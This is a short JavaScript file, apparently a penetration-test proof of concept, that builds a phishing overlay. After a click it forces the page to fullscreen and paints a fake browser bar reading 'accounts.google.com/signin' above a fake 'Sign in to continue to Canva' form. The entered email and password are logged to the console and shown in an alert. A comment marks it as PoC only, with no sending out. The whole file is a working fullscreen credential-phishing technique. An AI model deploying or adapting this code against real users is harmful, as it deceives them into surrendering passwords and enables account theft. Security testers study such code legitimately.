window.addEventListener('load', function() {
  // Trigger on click since fullscreen requires user gesture
  document.body.addEventListener('click', function handler() {
    document.body.removeEventListener('click', handler); // only trigger once
    
    document.documentElement.requestFullscreen().then(function() {

      document.body.innerHTML = `
        <div style="width:100vw;height:100vh;background:#fff;font-family:arial,sans-serif;display:flex;flex-direction:column;">
          <!-- Fake browser bar -->
          <div style="background:#f1f3f4;padding:8px 16px;display:flex;align-items:center;gap:12px;border-bottom:1px solid #ddd;">
            <div style="background:#fff;border:1px solid #ddd;border-radius:20px;padding:6px 16px;flex:1;font-size:14px;">
              🔒 accounts.google.com/signin
            </div>
          </div>
          <!-- Fake login -->
          <div style="display:flex;justify-content:center;align-items:center;flex:1;">
            <div style="width:400px;padding:40px;border:1px solid #ddd;border-radius:8px;text-align:center;">
              <h2 style="font-weight:400;">Sign in to continue to Canva</h2>
              <input id="email" type="email" placeholder="Email" style="width:100%;padding:12px;border:1px solid #ddd;border-radius:4px;font-size:16px;margin-bottom:16px;box-sizing:border-box;"/>
              <input id="pass" type="password" placeholder="Password" style="width:100%;padding:12px;border:1px solid #ddd;border-radius:4px;font-size:16px;margin-bottom:24px;box-sizing:border-box;"/>
              <button onclick="capture()" style="background:#1a73e8;color:#fff;border:none;padding:10px 24px;border-radius:4px;font-size:14px;cursor:pointer;">Next</button>
            </div>
          </div>
        </div>
      `;

      window.capture = function() {
        const data = {
          email: document.getElementById('email').value,
          pass: document.getElementById('pass').value
        };
        // PoC ONLY - log locally, do not exfiltrate
        console.log('[PENTEST POC] Captured:', JSON.stringify(data));
        alert('PoC Success - credentials would be captured here\n\n' + JSON.stringify(data));
        document.exitFullscreen();
      };

    }).catch(function(e) {
      console.log('fullscreen failed:', e.message);
    });
  });
});
